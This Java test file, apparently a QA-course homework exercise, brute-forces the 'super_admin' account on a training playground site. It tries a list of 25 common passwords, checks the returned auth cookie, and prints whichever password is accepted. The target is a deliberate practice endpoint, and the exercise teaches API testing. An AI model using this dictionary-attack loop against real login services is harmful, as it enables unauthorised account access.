package Sandbox;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.HashMap;
import java.util.Map;

public class Password {
  @ParameterizedTest
  @ValueSource(strings = {"123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"})
  public void testPassword(String password) {
    String login = "super_admin";

    Map<String, String> credentials = new HashMap<>();
    credentials.put("login", login);
    credentials.put("password", password);

    Map<String, String> cookies = new HashMap<>();

      Response response = RestAssured
              .given()
              .body(credentials)
              .when()
              .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
              .andReturn();

      String cookie = response.getCookie("auth_cookie");
      cookies.put("auth_cookie", cookie);

      response = RestAssured
              .given()
              .cookies(cookies)
              .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
              .andReturn();

      if (response.body().asString().equals("You are authorized")) {
        System.out.printf("Correct password is '%s' %n", password);
      }
    }
  }
